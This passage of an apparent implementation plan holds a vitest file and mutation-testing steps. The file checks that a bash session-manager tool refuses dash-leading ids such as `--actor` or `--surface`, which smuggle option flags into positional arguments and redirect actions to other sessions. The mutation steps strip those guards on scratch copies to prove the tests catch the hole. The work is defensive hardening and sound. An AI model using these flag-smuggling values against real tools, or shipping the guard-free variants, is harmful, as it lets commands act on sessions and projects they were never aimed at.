// WHICH BINARY. `DASH_PARITY_CCD` selects another copy. Spec §8's measurement
// runs this file once against the pre-wave `ccd/ccd`, written to a scratch file
// outside the tree, and the mutation rows run against scratch copies. So the
// tracked file is never overwritten to measure anything. When the variable is
// unset, the binary is the checkout's own `ccd/ccd`.
//
// COMPOSED, NEVER TYPED, with one exception: stop's second argv. Path identity
// W1a moves `stopId` to send `--surface` first, while a server from before W1a
// composes the id first. Whichever order the builder in this tree composes, the
// other is typed here, because no builder composes it.
//
// STANDING NOTE: this file matches `ccd-workspaces.test.ts`'s `/^ccd.*\.ts$/`
// containment scan. Its one bash spawn goes through `ghContainedEnv` and asks
// for both poisons.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { CCD, ghContainedEnv, harnessBin, makeCcdHarness, type CcdHarness } from './ccdWsHelpers.js';
import { CCD_ARGV, type ActorFlags } from '../src/ccdargv.js';
import { decOf, eventsOf, readJournal } from './lifecycleHelpers.js';
import { inheritedEnv } from './gitEnvStrip.js';
import { DASH_IDS, DECOY_IDS, plantRow, reapLocks, regDirOf, regListing } from './dashIdFixture.js';

const srcRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../src');

/** The binary under test. It is the checkout's own unless `DASH_PARITY_CCD` names a copy: spec §8's pre-wave run, or a
 *  mutation row's scratch copy. A path that names no file would make every row "refuse" (bash exits 127), so it fails
 *  the file at load. */
const CCD_UNDER_TEST = process.env.DASH_PARITY_CCD ?? CCD;
if (!fs.existsSync(CCD_UNDER_TEST)) throw new Error(`DASH_PARITY_CCD names no file: ${CCD_UNDER_TEST}`);

/** What `sweepDec` composes for an unattended lane: `reason: null`, so `decFlags` sends `--surface`/`--actor` only. */
const PROBE_DEC: ActorFlags = { surface: 'agent', actor: 'probe:dec parity', reason: null };
/** The same dec with a reason, so `decFlags` sends all three pairs. Never used for ws-add, whose loop has no `--reason`
 *  arm. */
const DEC_WITH_REASON: ActorFlags = { surface: 'agent', actor: 'probe:dec parity', reason: 'probe reason' };

/**
 * THE DERIVED SET. This is `ccdargv-dec-parity.test.ts`'s scan, copied rather than imported, because that file
 * exports nothing. Every `argv([…])` literal in the table is walked: its first quoted token is the verb, and a
 * `decFlags(` inside the literal declares that the verb takes a dec.
 */
function decAppendingVerbs(): string[] {
  const src = fs.readFileSync(path.join(srcRoot, 'ccdargv.ts'), 'utf8');
  const table = src.slice(src.indexOf('export const CCD_ARGV'));
  const found = new Set<string>();
  for (const m of table.matchAll(/argv\(\[([\s\S]*?)\]\)/g)) {
    const body = m[1]!;
    const verb = /^\s*'([a-z][a-z-]*)'/.exec(body)?.[1];
    if (verb !== undefined && body.includes('decFlags(')) found.add(verb);
  }
  return [...found].sort();
}

/** One verb's probe: the argvs its own builder composes for a probed id, what it needs planted beyond the decoy rows
 *  and the literal row, and how a decoy it must not touch is checked afterwards. */
interface DashProbe {
  argv: (id: string, dec: ActorFlags) => readonly (readonly string[])[];
  decoy: () => void;
  untouched: (id: string) => void;
}

/** A §2.2 verb that carries no dec: the argvs its builder composes with a dash-leading positional, and whether the
 *  verb must refuse it or, as plain ws-audit does, answers about the literal id. */
interface PositionalProbe {
  argv: (dash: string) => readonly (readonly string[])[];
  expect: 'refused' | 'literal';
}

const TOKEN = 'a'.repeat(64);
/** `wsCollect`'s token parameter type, named without importing L0 (this file reads `ccdargv.js` and nothing else from
 *  the shipped tree). */
type CollectTokenArg = Parameters<typeof CCD_ARGV.wsCollect>[0];
const DECOY_HOLD = 'program:decoy wave:1/1';
const JUNK_WITNESS = 'this is no witness\n';
/** The test roster's account the two-argument forms name. A dash project that a pre-wave stop takes as a pair
 *  composes `<wrapper>-<word>`, so the positional decoys include those ids too. */
const PAIR_WRAPPER = 'claude-a';
const POSITIONAL_DECOYS: readonly string[] = [...DECOY_IDS, ...DECOY_IDS.map((d) => `${PAIR_WRAPPER}-${d}`)];
/** Answers that only a verb which BOUND the id and looked it up as a row can give. §2.2 tells a redirect, a literal
 *  id and a refusal apart, so a refusal by lookup is not a refusal of the shape. */
const LOOKUP_WORDS = /no such session|no-such-session|not a workspace|not-a-workspace|not-witnessed|not held|no registry|"refused":"held"/;
/** A systemctl call that changes a unit. A read (`is-active`, `show`, `is-enabled`) does not match. */
const UNIT_CHANGE = /\b(?:enable|disable|start|stop|restart|try-restart|reset-failed|kill|mask)\b/;
/** A tmux call that kills, makes or types into a pane. `has-session` and `list-panes` reads do not match. */
const PANE_ACT = /\b(?:kill-session|new-session|send-keys|respawn-pane)\b/;

/** stop's two orders: the id first, as a server before path-identity W1a composes it, and `--surface` first, as W1a's
 *  builder composes it. */
const STOP_ID_FIRST = (id: string): readonly string[] => ['stop', id, '--surface', 'pwa'];
const STOP_ID_LAST = (id: string): readonly string[] => ['stop', '--surface', 'pwa', id];
const sameArgv = (a: readonly string[], b: readonly string[]): boolean =>
  a.length === b.length && a.every((t, i) => t === b[i]);
/** The order `CCD_ARGV.stopId` does NOT compose, typed. It is the one justified exception to "composed, never
 *  typed": no builder in this tree composes it, and a server on the other side of W1a still can. */
const stopOtherOrder = (id: string): readonly string[] =>
  sameArgv(CCD_ARGV.stopId(id, 'pwa'), STOP_ID_FIRST(id)) ? STOP_ID_LAST(id) : STOP_ID_FIRST(id);

let h: CcdHarness;
beforeEach(() => { h = makeCcdHarness('ccrc-dash-parity-'); });
afterEach(() => { h.cleanup(); });

/** The binary under test, run as a program through its own dispatcher in the fixture HOME, under `bash -p` (the token
 *  verbs and their audits refuse any other entry). Both streams and the exit code are folded into one answer, because
 *  ccd refuses in two dialects: a `die` (stderr, exit 1), or a `{"refused":…}` document on stdout at exit 0. */
const runCcd = (args: readonly string[]): { code: number; out: string } => {
  const stub = harnessBin(h.home);
  const opts = {
    encoding: 'utf8' as const, cwd: h.home,
    env: ghContainedEnv(h.home,
      { ...inheritedEnv(), HOME: h.home, PATH: `${stub}:${process.env.PATH ?? ''}` },
      { systemd: true, tmux: true }),
  };
  let res: { code: number; out: string };
  try {
    const stdout = execFileSync('bash', ['-p', CCD_UNDER_TEST, ...args], { ...opts, stdio: ['ignore', 'pipe', 'pipe'] });
    res = { code: 0, out: String(stdout).trim() };
  } catch (e) {
    const err = e as { status?: number | null; stdout?: string; stderr?: string };
    res = { code: err.status ?? 1, out: `${String(err.stdout ?? '')}${String(err.stderr ?? '')}`.trim() };
  }
  // 126 and 127 mean bash never ran ccd. Treated as answers, they would read as refusals and turn every row green.
  if (res.code === 126 || res.code === 127) throw new Error(`the ccd under test did not run (rc ${res.code}): ${res.out}`);
  return res;
};

/** The registry's rows and fields: `regListing` without its dot names. The lifecycle journal and the reap locks have
 *  their own assertions, and a dot-named helper lock is not a row. */
const rowFiles = (): string[] => regListing(h.home).filter((n) => !n.startsWith('.'));
const unitActs = (): string[] => h.systemctlCalls().filter((l) => l.includes('claude-session@') && UNIT_CHANGE.test(l));
const paneActs = (): string[] => h.tmuxCalls().filter((l) => PANE_ACT.test(l));

const plantSessionDecoys = (): void => {
  for (const d of DECOY_IDS) plantRow(h.home, d, { hold: DECOY_HOLD });
};
const holdsIntact = (): void => {
  for (const d of DECOY_IDS) {
    const p = path.join(regDirOf(h.home), `${d}.hold`);
    expect.soft(fs.existsSync(p) ? fs.readFileSync(p, 'utf8').trim() : null, `${d}'s hold`).toBe(DECOY_HOLD);
  }
};
/** The positional decoys, plus a directory for the dash project. A start or enable that took the dash as a project
 *  then finds a workdir and reaches its act; a refusal never reads it. */
const plantPositionalDecoys = (dash: string): void => {
  for (const d of POSITIONAL_DECOYS) plantRow(h.home, d, { hold: DECOY_HOLD });
  fs.mkdirSync(path.join(h.home, 'projects', dash), { recursive: true });
};
/** ws-restore journals the id it refuses as `bad-session-id` (its `_lc_refuse` practice). That one line is allowed. */
const isRestoresOwnRefusal = (verb: string, id: string, e: Record<string, unknown>): boolean =>
  verb === 'ws-restore' && e['act'] === 'restore' && e['outcome'] === 'refused'
  && e['refusal'] === 'bad-session-id' && e['id'] === id;

const DASH_PROBES: Record<string, DashProbe> = {
  'ws-release': { argv: (id, d) => [CCD_ARGV.wsRelease(id, d)], decoy: plantSessionDecoys, untouched: () => holdsIntact() },
  'ws-archive': { argv: (id, d) => [CCD_ARGV.wsArchive(id, d)], decoy: plantSessionDecoys, untouched: () => holdsIntact() },
  'ws-restore': { argv: (id, d) => [CCD_ARGV.wsRestore(id, d)], decoy: plantSessionDecoys, untouched: () => holdsIntact() },
  'ws-hold': { argv: (id, d) => [CCD_ARGV.wsHold(id, 'probe reason', d)], decoy: plantSessionDecoys, untouched: () => holdsIntact() },
  'ws-rename': { argv: (id, d) => [CCD_ARGV.wsRename(id, 'ws/probe', d)], decoy: plantSessionDecoys, untouched: () => holdsIntact() },
  'ws-reclaim': {
    argv: (id, d) => [CCD_ARGV.wsReclaim(TOKEN, 7, id, false, d)], decoy: plantSessionDecoys, untouched: () => holdsIntact(),
  },
  'ws-expire': { argv: (id, d) => [CCD_ARGV.wsExpire(TOKEN, id, d)], decoy: plantSessionDecoys, untouched: () => holdsIntact() },
  // A junk witness at `tmproots/agent`: before W1b a redirect to `agent` made agent a member of the collector's
  // population, so the verb opened `.reap-agent.lock` (spec §2.2).
  'ws-collect': {
    argv: (id, d) => [CCD_ARGV.wsCollect(TOKEN as CollectTokenArg, id, d)],
    decoy: () => {
      plantSessionDecoys();
      fs.mkdirSync(path.join(regDirOf(h.home), 'tmproots'), { recursive: true });
      fs.writeFileSync(path.join(regDirOf(h.home), 'tmproots', 'agent'), JUNK_WITNESS);
    },
    untouched: () => {
      holdsIntact();
      expect.soft(fs.readFileSync(path.join(regDirOf(h.home), 'tmproots', 'agent'), 'utf8'), 'the decoy witness')
        .toBe(JUNK_WITNESS);
    },
  },
  // ws-add's id is its PROJECT. A project of `--actor` used to become project `agent` (spec §2.2), so the decoy is a
  // real repo named `agent`, and a redirect would create a workspace in it.
  'ws-add': {
    argv: (id, d) => [CCD_ARGV.wsAddWorker(id, d)],
    decoy: () => { plantSessionDecoys(); h.makeRepo('agent'); },
    untouched: (id) => {
      holdsIntact();
      for (const p of ['agent', id]) {
        expect.soft(fs.existsSync(path.join(h.home, 'worktrees', p)), `a worktree under worktrees/${p}`).toBe(false);
      }
    },
  },
  stop: {
    argv: (id) => [CCD_ARGV.stopId(id, 'pwa'), stopOtherOrder(id)],
    decoy: plantSessionDecoys,
    untouched: () => holdsIntact(),
  },
};

const POSITIONAL_PROBES: Record<string, PositionalProbe> = {
  stopPair: { argv: (x) => [CCD_ARGV.stopPair(x, 'demo', 'pwa'), CCD_ARGV.stopPair(PAIR_WRAPPER, x, 'pwa')], expect: 'refused' },
  forget: { argv: (x) => [CCD_ARGV.forget(x)], expect: 'refused' },
  swap: { argv: (x) => [CCD_ARGV.swap(x, 'claude-b')], expect: 'refused' },
  swapCross: { argv: (x) => [CCD_ARGV.swapCross(x, 'claude-b')], expect: 'refused' },
  start: { argv: (x) => [CCD_ARGV.start(x, 'demo'), CCD_ARGV.start(PAIR_WRAPPER, x)], expect: 'refused' },
  enable: { argv: (x) => [CCD_ARGV.enable(x, 'demo'), CCD_ARGV.enable(PAIR_WRAPPER, x)], expect: 'refused' },
  // Plain ws-audit binds `$2` positionally and has no decision-flag loop. It audits the literal id and acts on
  // nothing: the stated residual `verbs-outside-sec1-keep-the-inline-regex`.
  wsAudit: { argv: (x) => [CCD_ARGV.wsAudit(x)], expect: 'literal' },
  wsReclaimAudit: { argv: (x) => [CCD_ARGV.wsReclaimAudit(x, false)], expect: 'refused' },
  wsExpireAudit: { argv: (x) => [CCD_ARGV.wsExpireAudit(x)], expect: 'refused' },
  wsCollectAudit: { argv: (x) => [CCD_ARGV.wsCollectAudit(x)], expect: 'refused' },
};

interface DecRow { readonly label: string; readonly dec: ActorFlags }
const DECS: readonly DecRow[] = [
  { label: 'without a reason', dec: PROBE_DEC },
  { label: 'with a reason', dec: DEC_WITH_REASON },
];
/** ws-add runs without a reason only, because its loop has no `--reason` arm. stop composes no dec, only
 *  `--surface pwa`, so it runs once per id and argv. */
const decsFor = (verb: string): readonly DecRow[] =>
  verb === 'ws-add' ? [DECS[0]!]
    : verb === 'stop' ? [{ label: 'none (stop sends --surface pwa only)', dec: PROBE_DEC }]
      : DECS;

describe('no dash-leading id redirects a verb the server composes, on the real binary (path-identity spec §2.8)', () => {
  it('every dec-appending verb has a dash probe, and stop has two orders', () => {
    expect(decAppendingVerbs())
      .toEqual(['ws-add', 'ws-archive', 'ws-collect', 'ws-expire', 'ws-hold', 'ws-reclaim', 'ws-release', 'ws-rename', 'ws-restore']);
    expect(decAppendingVerbs().filter((v) => !(v in DASH_PROBES)), 'a dec-appending verb has no dash probe').toEqual([]);
    expect(Object.keys(DASH_PROBES).sort()).toEqual([...decAppendingVerbs(), 'stop'].sort());
    for (const v of decAppendingVerbs()) expect(DASH_PROBES[v]!.argv('probe-id', PROBE_DEC), v).toHaveLength(1);
    // BOTH orders, exactly: the builder's own, and the other one typed. If the builder composed a third shape, this
    // set would differ.
    expect(DASH_PROBES['stop']!.argv('probe-id', PROBE_DEC).map((a) => a.join(' ')).sort())
      .toEqual([STOP_ID_FIRST('probe-id'), STOP_ID_LAST('probe-id')].map((a) => a.join(' ')).sort());
  });

  for (const verb of [...decAppendingVerbs(), 'stop']) {
    const probe = DASH_PROBES[verb];
    if (probe === undefined) continue;   // the anti-whitelist case above is red instead
    for (const id of DASH_IDS) {
      for (const { label, dec } of decsFor(verb)) {
        const n = probe.argv(id, dec).length;
        for (let k = 0; k < n; k++) {
          it(`${verb} refuses id ${id} under dec ${label}${n > 1 ? ` (argv ${k + 1} of ${n})` : ''}`, () => {
            // The literal row: a verb that binds the id AS GIVEN finds it and acts on it, so binding the literal
            // id is visible as an act, not only as a "no such session".
            plantRow(h.home, id);
            probe.decoy();
            const before = rowFiles();
            const r = runCcd(probe.argv(id, dec)[k]!);
            expect.soft(r.code !== 0 || r.out.includes('"refused"'), `answered as an act: rc ${r.code}: ${r.out}`).toBe(true);
            expect.soft(r.out, 'looked the id up as a row: the literal id was bound').not.toMatch(LOOKUP_WORDS);
            expect.soft(reapLocks(h.home), 'a refusal created a permanent reap lock').toEqual([]);
            const named = new Set<string>([...DECOY_IDS, id]);
            expect.soft(
              readJournal(h.home).filter((e) => named.has(String(e['id'])) && !isRestoresOwnRefusal(verb, id, e)),
              'a journal line names a decoy or the probed id',
            ).toEqual([]);
            expect.soft(unitActs(), 'a unit was changed').toEqual([]);
            expect.soft(paneActs(), 'a pane was killed or made').toEqual([]);
            expect.soft(rowFiles(), 'a registry row or field changed').toEqual(before);
            probe.untouched(id);
          });
        }
      }
    }
  }

  it('every §2.2 verb without a dec has a positional probe', () => {
    expect(Object.keys(POSITIONAL_PROBES).sort()).toEqual([
      'enable', 'forget', 'start', 'stopPair', 'swap', 'swapCross', 'wsAudit', 'wsCollectAudit', 'wsExpireAudit', 'wsReclaimAudit',
    ]);
    for (const k of Object.keys(POSITIONAL_PROBES)) expect(Object.keys(CCD_ARGV), `${k} is not a CCD_ARGV builder`).toContain(k);
    expect(Object.entries(POSITIONAL_PROBES).filter(([, p]) => p.expect === 'literal').map(([k]) => k)).toEqual(['wsAudit']);
  });

  for (const [name, probe] of Object.entries(POSITIONAL_PROBES)) {
    for (const dash of DASH_IDS) {
      const n = probe.argv(dash).length;
      for (let k = 0; k < n; k++) {
        it(`${name} given a dash-leading positional ${dash} acts on no decoy${n > 1 ? ` (argv ${k + 1} of ${n})` : ''}`, () => {
          plantPositionalDecoys(dash);
          const before = rowFiles();
          const r = runCcd(probe.argv(dash)[k]!);
          if (probe.expect === 'refused') {
            expect.soft(r.code !== 0 || r.out.includes('"refused"'), `answered as an act: rc ${r.code}: ${r.out}`).toBe(true);
          } else {
            expect.soft(r.out, 'plain ws-audit audits the literal id it was given').toContain(`"id":${JSON.stringify(dash)}`);
          }
          expect.soft(reapLocks(h.home), 'a reap lock was created').toEqual([]);
          expect.soft(readJournal(h.home).filter((e) => POSITIONAL_DECOYS.includes(String(e['id']))),
            'a journal line names a decoy').toEqual([]);
          expect.soft(unitActs(), 'a unit was changed').toEqual([]);
          expect.soft(paneActs(), 'a pane was killed or made').toEqual([]);
          expect.soft(rowFiles(), 'a registry row or field changed').toEqual(before);
        });
      }
    }
  }

  it('a dec whose actor or reason begins with "-" still reaches the journal', () => {
    // THE CONTROL (Review Focus 2): the fix narrows the id, never the prose. The dec reaches ws-release through its
    // builder, and the declared pairs land in the `release` row byte for byte.
    const id = 'demo-quiet-basin';
    plantRow(h.home, id, { hold: DECOY_HOLD });
    const r = runCcd(CCD_ARGV.wsRelease(id, { surface: 'agent', actor: '-device', reason: '--tidy' }));
    expect(r).toEqual({ code: 0, out: `released ${id}` });
    const released = eventsOf(h.home, 'release');
    expect(released, 'ws-release wrote no release line').toHaveLength(1);
    expect(released[0]!['id']).toBe(id);
    expect(decOf(released[0]!)).toEqual({ surface: 'agent', actor: '-device', reason: '--tidy' });
    expect(fs.existsSync(path.join(regDirOf(h.home), `${id}.hold`))).toBe(false);
  });
});
```

- [ ] **Step 2: See it fail against the pre-wave binary, and record the measurement (R20)**

Run this in the foreground, with a timeout of at least 600000 ms. The scratch directory has a fixed name, so later steps can find it from a fresh shell.

```bash
S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; mkdir -p "$S"
git fetch origin main && git show origin/main:ccd/ccd > "$S/ccd.pre"
(cd server && DASH_PARITY_CCD="$S/ccd.pre" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts --reporter=json --outputFile="$S/pre.json"); echo "pre-wave run rc=$?"
node -e 'const r = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8")); let red = 0, green = 0; for (const f of r.testResults) for (const a of f.assertionResults) { if (a.status === "failed") { red++; console.log("red: " + a.title); } else if (a.status === "passed") green++; } console.error(`red ${red}, green ${green}`);' "$S/pre.json" > "$S/pre-red.txt"
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md
{ printf '\n## Task 10: spec §8 measurement of §2.2 (pre-wave ccd/ccd = origin/main %s; stopId order per Step 0 a12)\n' "$(git rev-parse --short origin/main)"; cat "$S/pre-red.txt"; } >> "$L"
```

**Expected: FAIL.** The run's rc is non-zero, and `node` prints `red <n>, green <m>`. The file runs 259 cases: 152 dec rows, 104 positional rows and 3 standing cases. Every red below is a planning prediction, made on the read-only export and unmeasured:

| Verb or probe | Predicted red | Why (before W1b) |
|---|---|---|
| ws-release | 16 of 16 | `--actor`/`--surface`/`--reason` redirect to `agent`: `released agent`, the hold is gone. The literal ids answer `not held <id>` at exit 0 |
| ws-archive | 16 of 16 | the redirect and the literal both answer `not a workspace — refusing to archive a main checkout` (a lookup) |
| ws-restore | 16 of 16 | a refusal journaled against `agent` or the literal id with a token other than `bad-session-id`, or a reap lock |
| ws-hold | 12 of 16 | `--actor`/`--surface` are refused by arity (green). The other six ids bind the literal row, which is then held |
| ws-rename | 10 of 16 | `--actor`/`--surface`/`--reason` are refused by arity (green). The other five answer `not-a-workspace` for the literal row |
| ws-reclaim | 14 of 16 | the redirect takes `.reap-agent.lock`, and the literal ids take `.reap-<id>.lock`. `--defer-expired` is refused by arity (green) |
| ws-expire | 16 of 16 | as reclaim, and `--defer-expired` stays literal (lock) |
| ws-collect | 16 of 16 | the redirect takes `.reap-agent.lock` through the junk witness. The literal ids answer `not-witnessed` |
| ws-add | 2 of 8 | `--actor`/`--surface` become project `agent` and create a workspace. The other ids are refused `not a git repo` (green) |
| stop | 15 of 16 | the id-first order with `--surface` stops `pwa`. Every other id is stopped literally. The `--surface`-first order with id `--surface` is refused by arity (green) |
| stopPair | 15 of 16 (id-first builder) or 14 of 16 (W1a builder) | a dash wrapper or project composes `<dash>-demo` or `claude-a-<dash>` and stops it. The `--surface` project redirects to `claude-a-pwa` |
| start, enable | 8 of 16 each | argv 2, a dash project with its directory present, creates `claude-a-<dash>`. Argv 1, a dash wrapper, is refused `unknown wrapper` (green). This probe filters the journal by decoy id, so it cannot see enable's own row for `<dash>-demo`; Task 5's `ccd-project-dash.test.ts` pins that enable now refuses the wrapper before any journal line or lock |
| forget, swap, swapCross, wsAudit | 0 | refused by `unrecognised flag`, `:?usage` or `no registry`. Plain ws-audit audits the literal id |
| wsReclaimAudit, wsExpireAudit, wsCollectAudit | up to 8 each, unmeasured | red wherever the pre-wave answer is a document at exit 0 without `"refused"`. Record which |
| the anti-whitelist, positional-coverage and control cases | 0 | they read no ccd verdict, or the prose path was never narrowed |

How to read the measurement:
- A count that differs from a prediction is **not** a departure. The recorded set IS the measurement.
- A row red for a different KIND of reason is a departure: report it by slug in the wave-done. Examples: a thrown `the ccd under test did not run`, a vitest timeout, or a red on the control or the anti-whitelist. Use `parity-pre-wave-run-errored` with the measured text.

- [ ] **Step 3: Run it green against the wave's `ccd/ccd`**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts)
```

**Expected: PASS, 259 tests.**
- This task edits no ccd code. So any red row is a defect in Tasks 2 to 9 against their own ruling, never a reason to loosen an assertion.
- On a red row, **STOP** and report `parity-red-on-the-wave` with the row's title and its soft-assertion output. Name the task whose rule the row exercises: the arms (Tasks 2, 4), stop (3), the predicates (5), ws-add (6), the token verbs' entry (8) or the collector (9).

- [ ] **Step 4: The mutation rows, each on a scratch copy (the tracked `ccd/ccd` is never edited)**

Write the mutator once:

```bash
S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; mkdir -p "$S"
cat > "$S/mutate.mjs" <<'EOF'
// mutate.mjs <src> <dst> <from> <to> [nth]: copies <src> to <dst> with ONE occurrence of <from> replaced by <to>.
// Without [nth], <from> must occur exactly once (anything else writes nothing); with it, the nth in file order.
import fs from 'node:fs';
const [src, dst, from, to, nth] = process.argv.slice(2);
if (!src || !dst || !from || to === undefined) { console.error('usage: mutate.mjs <src> <dst> <from> <to> [nth]'); process.exit(2); }
const parts = fs.readFileSync(src, 'utf8').split(from);
const found = parts.length - 1;
const k = nth === undefined ? 1 : Number(nth);
if (nth === undefined ? found !== 1 : !(Number.isInteger(k) && k >= 1 && k <= found)) {
  console.error(`mutate: the anchor occurs ${found} time(s); nothing written`);
  process.exit(1);
}
fs.writeFileSync(dst, parts.slice(0, k).join(from) + to + parts.slice(k).join(from), { mode: 0o755 });
console.log(`mutate: replaced occurrence ${k} of ${found}`);
EOF
```

How to run the rows:
- Apply each row alone, as one command run in the foreground with a timeout of at least 600000 ms.
- Each row writes `$S/m.ccd`, runs `bash -n` on it, then runs the file against it. Nothing is restored afterwards, because nothing tracked changed.
- Every red text below was drafted, not measured. Record the measured one in the ledger. A count that differs is not a departure.

- **T10.1 Delete ws-release's identity arm** (occurrence 1 of 3):
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" '--session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;' '' 1 && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts -t 'ws-release refuses id')
  ```
  Red: ids `--actor`, `--surface` and `--reason` under both decs (6 rows). Each shows:
  - `answered as an act: rc 0: released agent`;
  - `a journal line names a decoy or the probed id` (a `release` row for `agent`);
  - `agent's hold: expected null to be 'program:decoy wave:1/1'`.
- **T10.2 Delete ws-archive's identity arm** (occurrence 2 of 3). Use the same command with nth `2` and filter `-t 'ws-archive refuses id'`.
  Red: the same 6 rows, with `looked the id up as a row` (`not a workspace — refusing to archive a main checkout` for `agent`).
- **T10.3 Delete ws-restore's identity arm** (occurrence 3 of 3). Use the same command with nth `3` and filter `-t 'ws-restore refuses id'`.
  Red: the same 6 rows, with `a journal line names a decoy or the probed id` (a `restore` refusal for `agent`), or a `.reap-agent.lock`.
- **T10.4 Delete ws-reclaim's identity arm:**
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" '--expect|--child-of|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;' '' && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts -t 'ws-reclaim refuses id')
  ```
  Red: 6 rows, `a refusal created a permanent reap lock: expected [ '.reap-agent.lock' ] to deeply equal []`.
- **T10.5 Delete ws-expire's identity arm** (occurrence 1 of 2):
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" '--expect|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;' '' 1 && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts -t 'ws-expire refuses id')
  ```
  Red: 6 rows, `.reap-agent.lock`.
- **T10.6 Delete ws-collect's identity arm** (occurrence 2 of 2). Use the same command with nth `2` and filter `-t 'ws-collect refuses id'`.
  Red: 6 rows. The redirect binds `agent`, which holds no `-`, so Task 9's pre-lock pass answers unmeasured `registry` before any lock: exit 1, no `.reap-agent.lock`, and a `collect` failure line (`probe-unmeasured`) journaled against `agent` (`a journal line names a decoy or the probed id`).
- **T10.7 Delete `_reg_id_ok`'s dash clause:**
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" '_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }' '_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ ]]; }' && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts)
  ```
  Red:
  - Every dec row of the eight `--session` verbs (128): for example `answered as an act: rc 0: not held --actor`, `looked the id up as a row`, `.reap---expect.lock`.
  - The `wsReclaimAudit`, `wsExpireAudit` and `wsCollectAudit` positional rows, unless the mutant's answer is itself a refusal (record which).

  Green: the stop and ws-add rows, because their own rules refuse first.
- **T10.8 Delete stop's surface-value rule:**
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" '[[ $# -ge 2 && $2 != -* ]] || die "usage: ccd stop' '[[ $# -ge 2 ]] || die "usage: ccd stop' && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts -t 'stop')
  ```
  Red:
  - The `stop refuses id --surface` row whose argv puts the id first (`stop --surface --surface pwa`): `answered as an act: rc 0: stopped pwa`, a `stop` line for `pwa`, and a `disable` call naming `claude-session@pwa`.
  - When (a12) recorded the id-first builder, also `stopPair given a dash-leading positional --surface acts on no decoy (argv 2 of 2)` (`stopped claude-a-pwa`).
- **T10.9 Delete stop's residue loop:**
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" 'for a in "$@"; do [[ $a != -* ]] || die "bad session id: $a"; done' ':' && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts -t 'stopPair given')
  ```
  Red: `stopPair … (argv 2 of 2)` for the seven dashes other than `--surface`. The composed `claude-a---actor` passes `_reg_id_ok` and is stopped (`a unit was changed`).
  The one-argument stop rows stay green, because stop's composed-id check refuses a dash-leading id. Run `-t 'stop refuses id'` once and record it.
- **T10.10 Delete `_ws_project_valid`'s dash line:**
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" $'  [[ "$1" != .* ]] || return 1\n  [[ "$1" != -* ]] || return 1' '  [[ "$1" != .* ]] || return 1' && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts -t 'start given|enable given')
  ```
  Red: `start …` and `enable … (argv 2 of 2)` for all eight dashes (16 rows). A row `claude-a-<dash>` is created (`a registry row or field changed`), and a pane is made.
- **T10.11 Delete ws-add's duplicate-actor rule:**
  ```bash
  S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; node "$S/mutate.mjs" ccd/ccd "$S/m.ccd" '[[ $# -ge 2 ]] && (( ! lc_ga )) ||' '[[ $# -ge 2 ]] ||' && bash -n "$S/m.ccd" && (cd server && DASH_PARITY_CCD="$S/m.ccd" ./node_modules/.bin/vitest run test/ccdargv-dash-id-parity.test.ts -t 'ws-add refuses id')
  ```
  Red: `ws-add refuses id --actor under dec without a reason`, with an `agent-<slug>.uuid` row and `a worktree under worktrees/agent`.
- **T10.12 A blindness to record, not a mutation that must go red.** Delete ws-hold's arm (`--session|--reason) if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;`, replaced by `''`) and run `-t 'ws-hold refuses id'`.
  - Expected: **GREEN**. Hold's flag-shaped ids are refused by arity, and its own `--reason` spelling is refused by `_reg_id_ok`, with or without the arm. Rename's arm is blind here for the same reasons.
  - Record it in the ledger as `hold-and-rename-arms-are-matrix-blind`. Task 4's file pins those two arms.

After the table, confirm that nothing tracked moved:

